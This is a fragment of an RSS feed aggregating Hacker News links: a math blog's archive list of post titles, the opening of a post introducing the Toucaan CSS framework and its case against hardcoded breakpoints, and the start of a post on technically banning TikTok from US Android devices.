        <span>Feb 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/02/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 31, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/01/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 29, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/01/29/unflippable-polygon.html">An unflippable polygon</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 18, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/01/18/when-does-2sat.html">When does 2SAT have an integral relaxation?</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 15, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/01/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 12, 2020</span>

        <h2>
          <a href="https://11011110.github.io/blog/2020/01/12/counting-grid-polygonalizations.html">Counting grid polygonalizations</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/12/31/year-end-linkage.html">Year-end linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 20, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/12/20/asymptotics-recamans-sequence.html">Asymptotics of Recamán's sequence</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/12/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 30, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/11/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 27, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/11/27/recoloring-infinite-paths.html">Recoloring infinite paths</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 25, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/11/25/reconfiguring-3-colorings.html">Reconfiguring 3-colorings</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/11/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/31/halloween-linkage.html">Halloween linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 19, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/19/dont-walk.html">Don't walk</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 17, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/17/mathjax-3-jekyll.html">MathJax 3 in Jekyll and Kramdown</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 16, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/16/from-one-fold.html">From one fold to another</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 12, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/12/hardness-planar-hamiltonian.html">Hardness of planar Hamiltonian decomposition and linear arboricity</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 7, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/10/07/drawing-clustered-graphs.html">Drawing clustered graphs of bounded width</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 30, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/09/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 26, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/09/26/congratulations-dr-mamano.html">Congratulations, Dr. Mamano!</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 22, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/09/22/1000-women-stem.html">One thousand women of STEM!</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/09/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 29, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/29/grid-majors.html">Grid majors</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 27, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/27/congratulations-dr-besa.html">Congratulations, Dr. Besa!</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 22, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/22/serpentine-belts.html">Serpentine belts</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 17, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/17/footprints-in-snow.html">Footprints in the snow</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 10, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/10/report-from-cccg.html">Report from CCCG</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 9, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/09/university-alberta-botanic.html">University of Alberta Botanic Gardens</a>
        </h2>
      </li>
    
      <li>
        <span>Aug 7, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/08/07/report-from-wads.html">Report from WADS</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/07/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 29, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/07/29/zipless-polycube.html">A zipless polycube</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 28, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/07/28/any-order-puzzle.html">Any-order puzzle deduction</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/07/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jul 13, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/07/13/connectivity-finiteness-modal.html">Connectivity and finiteness in modal graph logic</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 30, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 21, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/21/report-from-socg.html">Report from SoCG</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 20, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/20/portland-street-art.html">Portland street art</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/15/linkage.html">Linkage for the end of an academic year</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 11, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/11/dancing-arc-quadrilaterals.html">Dancing arc-quadrilaterals</a>
        </h2>
      </li>
    
      <li>
        <span>Jun 7, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/06/07/little-knowledge-can.html">A little knowledge can make the next step harder</a>
        </h2>
      </li>
    
      <li>
        <span>May 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>May 27, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/27/shattering-quasipolynomiality.html">Shattering and quasipolynomiality</a>
        </h2>
      </li>
    
      <li>
        <span>May 25, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/25/more-matching-mimicking.html">More matching-mimicking networks</a>
        </h2>
      </li>
    
      <li>
        <span>May 21, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/21/congratulations-dr-tillman.html">Congratulations, Dr. Tillman!</a>
        </h2>
      </li>
    
      <li>
        <span>May 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>May 2, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/05/02/playing-model-trains.html">Playing with model trains and calling it graph theory</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 30, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 23, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/23/euler-characteristics-nonmanifold.html">Euler characteristics of non-manifold polycubes</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 14, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/14/monochromatic-grids-colored.html">Monochromatic grids in colored grids</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 11, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/11/coloring-kinggraphs.html">Coloring kinggraphs</a>
        </h2>
      </li>
    
      <li>
        <span>Apr 7, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/04/07/photos-from-barbados.html">Photos from Barbados</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/03/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/03/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 13, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/03/13/planar-graphs-needing.html">Planar graphs needing many lines</a>
        </h2>
      </li>
    
      <li>
        <span>Mar 12, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/03/12/counting-polygon-triangulations.html">Counting polygon triangulations is hard</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 28, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/02/28/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 21, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/02/21/mutual-nearest-neighbors.html">Mutual nearest neighbors versus closest pairs</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/02/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Feb 9, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/02/09/big-convex-polyhedra.html">Big convex polyhedra in grids</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 31, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/01/31/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 29, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/01/29/simplifying-task-milestone.html">Simplifying task-milestone diagrams</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 17, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/01/17/orientations-infinite-graphs.html">Orientations of infinite graphs</a>
        </h2>
      </li>
    
      <li>
        <span>Jan 15, 2019</span>

        <h2>
          <a href="https://11011110.github.io/blog/2019/01/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 31, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/31/linkage.html">Linkage for the end of the year</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 27, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/27/motorcycle-graphs-eventual.html">Motorcycle graphs and the eventual fate of sparse Life</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 22, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/22/circles-crossing-equal.html">Circles crossing at equal angles</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 15, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 8, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/08/general-position-hypercube.html">General-position hypercube projections</a>
        </h2>
      </li>
    
      <li>
        <span>Dec 2, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/12/02/triply-hamiltonian-edge.html">Triply-Hamiltonian edge colorings</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 30, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/11/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 15, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/11/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 12, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/11/12/gurobi-vs-no.html">Gurobi versus the no-three-in-line problem</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 10, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/11/10/random-no-three.html">Random no-three-in-line sets</a>
        </h2>
      </li>
    
      <li>
        <span>Nov 1, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/11/01/95-women-stem.html">95 women of STEM</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 31, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/10/31/linkage-for-halloween.html">Linkage for Halloween</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 22, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/10/22/layered-pathwidth-obstacles.html">Layered pathwidth and its obstacles</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 20, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/10/20/laminar-3-separators.html">Laminar 3-separators</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 15, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/10/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Oct 7, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/10/07/recognizing-sparse-leaf.html">Recognizing sparse leaf powers</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 30, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/09/30/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 15, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/09/15/linkage.html">Linkage</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 8, 2018</span>

        <h2>
          <a href="https://11011110.github.io/blog/2018/09/08/pictures-from-manila.html">Pictures from Manila</a>
        </h2>
      </li>
    
      <li>
        <span>Sep 5, 2018</span>

   …</li></ul></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://11011110.github.io/blog/all/">https://11011110.github.io/blog/all/</a></em></p>]]>
            </description>
            <link>https://11011110.github.io/blog/all/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530267</guid>
            <pubDate>Sat, 19 Sep 2020 20:56:44 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rethinking CSS Frameworks]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24530230">thread link</a>) | @marvindanig
<br/>
September 19, 2020 | https://bubblin.io/blog/toucaan-introduction | <a href="https://web.archive.org/web/*/https://bubblin.io/blog/toucaan-introduction">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>[Updated on: Jun, 09<sup>st</sup> 2020.]</p>
<blockquote>
<p>These notes are available on
a <a href="https://bubblin.io/cover/the-toucaan-framework-by-marvin-danig#frontmatter" target="_blank">book</a>.</p>
</blockquote>
<h2 id="introduction">Introduction</h2>
<p>2020 is <del>almost</del> here.</p>
<p>It is unlikely that you and I are going to blast off to Mars or the Moon
on a <a href="https://www.spacex.com/starship" rel="nofollow" target="_blank">Spacex Starship</a> <del>anytime soon</del> ever,
so we better turn our gaze towards another frontier of technology:</p>
<p>CSS. 🙃</p>
<p>Let’s take a look at how we could use the new powers of CSS to write modern
web applications of 2020 and beyond, here on Earth.</p>
<p>On this post, we will revisit the basics of a webpage, i.e. HTML &amp; CSS,
and develop a clean intelligent and maintainable CSS framework from scratch.
I have named our new CSS framework <a href="https://toucaan.com/" target="_blank">Toucaan</a> and you can
join me on the journey of building it together.</p>
<p>Here is its official <a href="https://github.com/bookiza/toucaan" rel="nofollow" target="_blank">repository</a> and a
noddy Toucan logo that I made using CSS.</p>

<div>
<p><a href="http://toucaan.com/" target="_blank"><img src="https://raw.githubusercontent.com/bookiza/toucaan/master/assets/toucaan.png" alt="Toucaan-A Tropical CSS Framework" width="400"></a></p><h2>The Tropical CSS Framework.</h2>
</div>

<p>Qualitatively speaking the intent of Toucaan is to weed out all the unwanted
CSS that a framework doesn’t need anymore. It is a deep-dive into the core
properties of CSS standards in a bid to discover new and useful patterns
according to <a href="https://bubblin.io/blog/the-new-landscape-of-the-web" target="_blank">the new landscape of the web</a>.</p>
<p>Who knows we might even identify a few industry-wide antipatterns in the process
and we can address those with a few suggestions as we go about building
Toucaan ground up.</p>
<h3 id="why-call-it-toucaan">Why call it Toucaan</h3>
<p>Well, quite simply because I owned the pretty domain name.</p>
<p>Besides Toucan is a beautiful bird. This aggressive little arboreal ramphastidus symbolizes both beauty and strength. We are going to base our CSS framework on this highly social and resilient bird to implement a styling stricture that will cover all the wilderness on the web. Ocassionally—though rarely—we may even spar with other CSS frameworks using our “colorful, mean and oversized” bill.</p>
<p>So—say hello to <strong>Toucaan</strong>—the tropical CSS framework for the web. 😉</p>
<div><div><pre><code>👉 CSS may be hard but… **if Tou-caan, then you can too!**
</code></pre></div></div>

<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/charlesbabbage.jpg" width="100%">
</p>

<p>With Toucaan we will revisit every web design and layouting principle that there is.
Test our ideas out in the open. No trick or technique, whether old or new is off the
table, but we will certainly avoid using hacks. There are a few other rules that
Toucaan will adhere to and those are described over <a href="https://github.com/bookiza/toucaan/blob/master/RULES.md" rel="nofollow" target="_blank">here</a>.</p>
<p>Now there are a lot of well-established CSS frameworks out there like the Bootstrap,
Bulma, Foundation, TailwindCSS, and a bunch of strategies like the BEM, OOCSS, or SMACSS
(and others) to organize the application code but we will not try to imitate or wrestle with those.</p>
<p>We will rather write Toucaan on a blank slate and in such a way that we do not take away
most of what these tools have to offer, but we also end-up with more that is possible
with what’s new on the table for everyone to use lately. On production.</p>
<p>Let’s begin.</p>

<p>Before we write our first line of code let us take a deep breath and look at the
variety of devices that are a part of the web today. With subtle differences in
their aspect ratios, device handling &amp; user behavior, browser support, and screen-wise
capabilities it is important to understand what the new landscape of the web looks
like today and understand exactly what we are up against for the new framework of 2020.</p>
<p>Here are some of the devices that sport a modern web browser:
<br></p>
<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/major-devices.png" alt="Major web devices." width="100%">
</p>
<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/web-devices.png" alt="Major web devices." width="100%">
</p>

<p>There is the Apple Watch 5 with a Webkit browser and the iPhones are available
in numerous sizes instead of just the one model that Apple used to promote earlier.
There are multiple iPads and iPad Pros, a slew of Android tablets
of different form-factors plus the desktops, laptops, and touchscreen tablet-PCs.</p>
<p>Smart televisions like the LG OLED series (and many others) come with a solid stock
browser and a pointer driven UI as well. Given that Samsung came out with a foldable phone recently and Microsoft
has <del>is probably coming out with</del> outed a foldable Surface tablet, it is
rather safe to assume that screens available today are on
a <strong>linear continuum</strong> of size and form-factor.</p>
<p>That the slate of glass is practically resizable freely just like the desktop browser itself.</p>
<p>And the web is no longer tied to a “mobile-first” paradigm alone.</p>
<p>One can easily consider a large phone a tablet (phablet?) or a tablet could
easily be turned into a desktop with options. While there is a large variety
of devices that are available on the web today, there is also a great
difference in the behavior, the way users interact with each of these devices—–ala,
subtle differences in controls and input methods, accessibility over the content.</p>
<p>Other than that there are cars too on the web—–in that, smartcars
sport a neat web browser for those who need to be online on road.
And low-powered devices on the budget end of the market, like the Nokia 2.2
on Android (with A53 core) or similar that are very popular in their segment.</p>

<div>
<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/tesla-falcon.png" alt="Major web devices." width="50%"></p><p>Credit: Stuart O'Neil, The Noun Project.</p>
</div>

<p>Since Toucaan is about living CSS a short distance into the future, we
will consider the V9 web browser on Tesla into the scope of our project as well.
This is something that I have been meaning to do for quite some time and given
that people will have nothing to do but surf the web or <a href="https://bubblin.io/" target="_blank">read a book</a> in
a self-driving car, this sounds like a reasonable thing to do.</p>

<div>
<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/tesla-web-browser.png" alt="Major web devices." width="100%"></p><p>Web is way bigger than it ever was.</p>
</div>

<blockquote>
<p><strong>Quick note</strong>: I wanted to publish this article three&gt; years ago but the
rate of change in the industry kept me from doing so. With new features being
rolled out every week it was hard to keep up and decide on a strategy.
CSS grids or Flexbox, ES6 or not, and that whole reactive developer toolchain thing.
All those “developer happiness” bits kept flowing while Apple &amp; Google announced a
non-rectangular <a href="https://bubblin.io/blog/notch" target="_blank">notched phones</a>
upsetting my plans to do a paced research.</p>
</blockquote>
<p>The web is enormous now and it is no doubt much harder to design and scale
web-apps between the lowest and the highest options available today.</p>
<p>Notice that we are not even talking about browsers inconsistencies at this point.
The range of hardware itself is wide enough to somewhat trump the very
first assumption taken by nearly all the major CSS frameworks:</p>
<blockquote>
<p><strong>“Hardcoded breakpoints on CSS @media-queries”</strong>.</p>
</blockquote>
<p>Voila, and now we have our first <strong>anti-pattern</strong> to go after! ( ͡° ͜ʖ ͡°)</p>

<p>Breakpoints are hardcoded on Tailwind CSS like this [<a href="https://tailwindcss.com/docs/theme#screens" rel="nofollow" target="_blank">1</a>, <a href="https://tailwindcss.com/docs/breakpoints/" rel="nofollow" target="_blank">2</a>], for example.</p>
<div><div><pre><code><span>// tailwind.config.js</span>
<span>module</span><span>.</span><span>exports</span> <span>=</span> <span>{</span>
  <span>theme</span><span>:</span> <span>{</span>
    <span>screens</span><span>:</span> <span>{</span>
      <span>'</span><span>sm</span><span>'</span><span>:</span> <span>'</span><span>640px</span><span>'</span><span>,</span> <span>// Translates to hardcoded break-points in media queries.</span>
      <span>'</span><span>md</span><span>'</span><span>:</span> <span>'</span><span>768px</span><span>'</span><span>,</span>
      <span>'</span><span>lg</span><span>'</span><span>:</span> <span>'</span><span>1024px</span><span>'</span><span>,</span>
      <span>'</span><span>xl</span><span>'</span><span>:</span> <span>'</span><span>1280px</span><span>'</span><span>,</span>
    <span>}</span>
  <span>}</span>
<span>}</span>
</code></pre></div></div>
<p>On Bulma, the breakpoints [<a href="https://github.com/jgthms/bulma/blob/49708a36a1f88870ec19db74888acc526a4188f3/css/bulma.css#L497" rel="nofollow" target="_blank">1</a>] are used similarly
to silo the blocks of css code like so:</p>
<div><div><pre><code><span>/* Bulma CSS like any other framework uses hardcoded breakpoints like so: */</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>max-width</span><span>:</span> <span>768px</span><span>)</span> <span>{</span> <span>/* Some style classes &amp; rules here. */</span> <span>}</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>min-width</span><span>:</span> <span>769px</span><span>),</span> <span>print</span> <span>{</span> <span>/* Same classNames but different rules here. */</span> <span>}</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>max-width</span><span>:</span> <span>1023px</span><span>)</span> <span>{</span> <span>/* We armtwist the ruleset again… */</span> <span>}</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>min-width</span><span>:</span> <span>1024px</span><span>)</span> <span>{</span> <span>/* Are we on the desktops now? */</span> <span>}</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>min-width</span><span>:</span> <span>1216px</span><span>)</span> <span>{</span> <span>/* Dang!, what are we supporting here? */</span> <span>}</span>

<span>@media</span> <span>screen</span> <span>and</span> <span>(</span><span>min-width</span><span>:</span> <span>1408px</span><span>)</span> <span>{</span> <span>/* Is this the iPad Pro 12.9 inches or something else? */</span> <span>}</span>
</code></pre></div></div>
<p>Then for each silo this happens on the CSS elsewhere…</p>
<div><div><pre><code><span>+</span><span>mobile</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'mobile'</span><span>)</span>

<span>+</span><span>tablet</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'tablet'</span><span>)</span>

<span>+</span><span>touch</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'touch'</span><span>)</span>

<span>+</span><span>desktop</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'desktop'</span><span>)</span>

<span>+</span><span>widescreen</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'widescreen'</span><span>)</span>

<span>+</span><span>fullhd</span>
  <span>+</span><span>typography-size</span><span>(</span><span>'fullhd'</span><span>)</span>
</code></pre></div></div>
<p>Bootstrap does the same thing… and then thousands of utility <code>classNames</code> are
repeated on each silo of devices to cater to the behavior desired of that group.</p>
<p>Pretty much every CSS framework follows this pattern and a new breakpoint is added
every few years to account for industry-level changes. The question is how many
breakpoints will cover the new landscape of the web now?</p>
<p>Can we continue this way as the industry continues to evolve at a break-neck speed.</p>
<p>At what point will the hardcoded breakpoints become all too many?</p>
<h3 id="mode-driven-instead-of-data-driven">Mode-driven instead of data-driven:</h3>
<p>While it would be a nice exercise to plot a graph of all the screen sizes
(pixel ratio data) that are available on the market, but going down this path to
figure out the ideal set of breaking point values to separate watches from mobile
from tablets from desktops from cars to any other larger surface that is about to
come on the web is anything but scalable. Or even practical.</p>
<p>In my opinion, using hardcoded values on CSS media queries is an artifact of the
mobile-web. A result from the tunnel vision that we have had of the web since the very first iPhone.
It is a simplistic solution from a simpler time that is no longer valid today.</p>
<p>An anti-pattern that should be done away with.</p>
<p>So, is there a way to implement layout responsively without using hardcoded
break-points?</p>
<p>Turns out, there is!</p>
<p>We can build any kind of responsive application using a really simple and smart
set of rules that we will talk about in the next section.</p>
<h2 id="the-two-states-of-web-design">The Two States of Web Design.</h2>
<p>There are only two states of web-design. Let’s see how:</p>
<p>Ccreate a <a href="https://raw.githubusercontent.com/bookiza/toucaan/master/examples/example0.html" rel="nofollow" target="_blank">blank page</a>
on your machine and load it on a browser (desktop) first.</p>
<p>This is easy enough, simply jump into the terminal and:</p>
<div><div><pre><code><span>$ </span><span>touch </span>example0.html     // Create a new file but <span>do </span>not write anything on it.

<span>$ </span>chrome example0.html    // Open this 0 byte files on your favorite browser.
</code></pre></div></div>
<p>What do you see on this blank page?</p>
<p>Of course nothing. It is an all-white or an all-black blank page depending
on settings. Did you know that this blank webpage is already responsive?</p>
<p>No CSS or media-query is required to adapt the UX/UI of a blank page on mobile
or desktop or any other web device. You can resize the browser to any size or
aspect ratio and the blank page will continue to scale accurately.</p>
<p>It’s perfectly responsive, and just “belongs to” the device naturally. Intrinsically.</p>

<div>
<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/viewports.png" alt="Major web devices." width="66%"></p><p>Viewport rectangles of the browser window on resize.</p>
</div>

<p>Let’s switch gears and mount the desktop in portrait mode instead:</p>

<p><img src="https://raw.githubusercontent.com/marvindanig/assets/master/desktop-portrait-landscape.png" width="100%">
</p>

<p>Now the rectangular screen is in portrait orientation so the browser window
will appear longer in height—kind of like a mobile phone but</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://bubblin.io/blog/toucaan-introduction">https://bubblin.io/blog/toucaan-introduction</a></em></p>]]>
            </description>
            <link>https://bubblin.io/blog/toucaan-introduction</link>
            <guid isPermaLink="false">hacker-news-small-sites-24530230</guid>
            <pubDate>Sat, 19 Sep 2020 20:50:03 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Can TikTok be banned from US based Android devices?]]>
            </title>
            <description>
<![CDATA[
Score 19 | Comments 31 (<a href="https://news.ycombinator.com/item?id=24530155">thread link</a>) | @bluegopher
<br/>
September 19, 2020 | https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/ | <a href="https://web.archive.org/web/*/https://raccoon.onyxbits.de/blog/trump-ban-tiktok-wechat-usa/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>
      Legal questions aside, let's explore the technical possibilities.
    </p><div>

<p>Let’s be very clear here. I am not a fan of TikTok. I had the misfortune of coming across it when it was still called Musically and I had to explain to a little girl that she, unlike her friends, was not allowed to dance for strangers. That ruined an otherwise perfect evening.</p>

<p>I’m also not a fan of Donald Trump(et). It’s safe to assume that he threatens to shut down TikTok for all the wrong reasons, but if he manages to pull through, it will be a benefit for mankind. So, is it actually technically possible to get TikTok and WeChat banned in the US?</p>

<h2 id="removing-apps-from-google-play">Removing apps from Google Play</h2>

<p>Story time (you can skip ahead two paragraphs for an obvious revelation)!</p>

<p>I once wrote a pretty silly slot machine game for Android. It was as a coding exercise and failed in pretty much every aspect except being recognized for what it actually wasn’t: a real gambling app.
</p><figure>
